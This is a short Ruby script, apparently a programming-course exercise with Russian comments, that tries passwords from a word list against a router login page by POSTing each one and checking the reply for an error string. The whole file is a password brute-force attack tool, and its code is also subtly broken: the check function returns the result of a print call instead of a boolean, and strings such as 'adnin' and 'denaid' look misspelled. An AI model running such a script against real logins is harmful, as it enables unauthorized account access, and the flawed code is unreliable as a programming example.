require 'net/http'
require 'uri'

def is_wrong_password? password

	uri=URI.parse 'http://rubyschool.us/router'
	# post запроса взят из fidler
	#и помещён в хеш метода post_form
	response=Net::HTTP.post_form (uri, :login=>'adnin', :password=>password).body
	# в body htnl отслеживается сообщение об ошибке
	puts response.include? 'denaid'
	# возвращается bool
end


input=File.open "passwords.txt",'r'
while line=input.gets
		print "Trying password #{line}"
		if is_wrong_password? line
			puts "ERROR"
		else
			return line
			input.close
			break
		end	
end
puts "Password : #{line}"

